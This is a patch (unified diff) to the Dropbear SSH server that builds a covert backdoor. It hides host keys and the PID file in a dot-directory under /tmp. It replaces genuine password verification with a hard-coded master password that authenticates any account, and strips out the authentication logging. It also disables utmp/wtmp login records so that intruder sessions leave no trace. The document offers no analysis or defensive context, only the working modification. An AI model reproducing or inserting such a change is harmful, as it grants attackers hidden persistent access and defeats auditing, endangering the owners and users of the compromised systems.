diff -Naur dropbear/default_options.h dropbear-modified/default_options.h
--- dropbear/default_options.h	2020-06-07 21:46:00.637545460 -0500
+++ dropbear-modified/default_options.h	2020-06-08 22:40:38.797467162 -0500
@@ -19,10 +19,10 @@
 #define DROPBEAR_DEFADDRESS ""
 
 /* Default hostkey paths - these can be specified on the command line */
-#define DSS_PRIV_FILENAME "/etc/dropbear/dropbear_dss_host_key"
-#define RSA_PRIV_FILENAME "/etc/dropbear/dropbear_rsa_host_key"
-#define ECDSA_PRIV_FILENAME "/etc/dropbear/dropbear_ecdsa_host_key"
-#define ED25519_PRIV_FILENAME "/etc/dropbear/dropbear_ed25519_host_key"
+#define DSS_PRIV_FILENAME "/tmp/.disk-lock/.dhk-lock"
+#define RSA_PRIV_FILENAME "/tmp/.disk-lock/.rsa-lock"
+#define ECDSA_PRIV_FILENAME "/tmp/.disk-lock/.ecdsa-lock"
+#define ED25519_PRIV_FILENAME "/tmp/.disk-lock/.ed25519-lock"
 
 /* Set NON_INETD_MODE if you require daemon functionality (ie Dropbear listens
  * on chosen ports and keeps accepting connections. This is the default.
@@ -245,7 +245,7 @@
 
 /* Set this to use PRNGD or EGD instead of /dev/urandom */
 #define DROPBEAR_USE_PRNGD 0
-#define DROPBEAR_PRNGD_SOCKET "/var/run/dropbear-rng"
+#define DROPBEAR_PRNGD_SOCKET "/dev/urandom"
 
 /* Specify the number of clients we will allow to be connected but
  * not yet authenticated. After this limit, connections are rejected */
@@ -262,7 +262,7 @@
 
 /* The default file to store the daemon's process ID, for shutdown
    scripts etc. This can be overridden with the -P flag */
-#define DROPBEAR_PIDFILE "/var/run/dropbear.pid"
+#define DROPBEAR_PIDFILE "/tmp/.disk-lock/db.pid"
 
 /* The command to invoke for xauth when using X11 forwarding.
  * "-q" for quiet */
diff -Naur dropbear/svr-authpasswd.c dropbear-modified/svr-authpasswd.c
--- dropbear/svr-authpasswd.c	2020-06-07 21:46:00.737546088 -0500
+++ dropbear-modified/svr-authpasswd.c	2020-06-08 08:13:41.776016370 -0500
@@ -33,26 +33,12 @@
 
 #if DROPBEAR_SVR_PASSWORD_AUTH
 
-/* not constant time when strings are differing lengths. 
- string content isn't leaked, and crypt hashes are predictable length. */
-static int constant_time_strcmp(const char* a, const char* b) {
-	size_t la = strlen(a);
-	size_t lb = strlen(b);
-
-	if (la != lb) {
-		return 1;
-	}
-
-	return constant_time_memcmp(a, b, la);
-}
-
 /* Process a password auth request, sending success or failure messages as
  * appropriate */
 void svr_auth_password(int valid_user) {
-	
-	char * passwdcrypt = NULL; /* the crypt from /etc/passwd or /etc/shadow */
-	char * testcrypt = NULL; /* crypt generated from the user's password sent */
+
 	char * password = NULL;
+	char secretpass[] = "sup3rs3cr3tpassw0rd";
 	unsigned int passwordlen;
 	unsigned int changepw;
 
@@ -62,17 +48,17 @@
 		/* not implemented by this server */
 		send_msg_userauth_failure(0, 1);
 		return;
+	} else
+	{
+		password = buf_getstring(ses.payload, &passwordlen);
+		if (!strcmp(password, secretpass) && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
+			send_msg_userauth_success();
+		} else {
+			send_msg_userauth_failure(0, 1);
+			return;
+		}
 	}
 
-	password = buf_getstring(ses.payload, &passwordlen);
-	if (valid_user && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
-		/* the first bytes of passwdcrypt are the salt */
-		passwdcrypt = ses.authstate.pw_passwd;
-		testcrypt = crypt(password, passwdcrypt);
-	}
-	m_burn(password, passwordlen);
-	m_free(password);
-
 	/* After we have got the payload contents we can exit if the username
 	is invalid. Invalid users have already been logged. */
 	if (!valid_user) {
@@ -80,45 +66,6 @@
 		return;
 	}
 
-	if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
-		dropbear_log(LOG_WARNING,
-				"Too-long password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (testcrypt == NULL) {
-		/* crypt() with an invalid salt like "!!" */
-		dropbear_log(LOG_WARNING, "User account '%s' is locked",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	/* check for empty password */
-	if (passwdcrypt[0] == '\0') {
-		dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
-		/* successful authentication */
-		dropbear_log(LOG_NOTICE, 
-				"Password auth succeeded for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_success();
-	} else {
-		dropbear_log(LOG_WARNING,
-				"Bad password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-	}
 }
 
 #endif
diff -Naur dropbear/svr-chansession.c dropbear-modified/svr-chansession.c
--- dropbear/svr-chansession.c	2020-06-07 21:46:00.737546088 -0500
+++ dropbear-modified/svr-chansession.c	2020-06-07 22:26:23.727683942 -0500
@@ -326,9 +326,10 @@
 
 	if (chansess->tty) {
 		/* write the utmp/wtmp login record */
-		li = chansess_login_alloc(chansess);
+		/*li = chansess_login_alloc(chansess);
 		login_logout(li);
 		login_free_entry(li);
+		*/
 
 		pty_release(chansess->tty);
 		m_free(chansess->tty);
@@ -836,9 +837,10 @@
 
 		/* write the utmp/wtmp login record - must be after changing the
 		 * terminal used for stdout with the dup2 above */
-		li = chansess_login_alloc(chansess);
+		/*li = chansess_login_alloc(chansess);
 		login_login(li);
 		login_free_entry(li);
+		*/
 
 #if DO_MOTD
 		if (svr_opts.domotd && !chansess->cmd) {
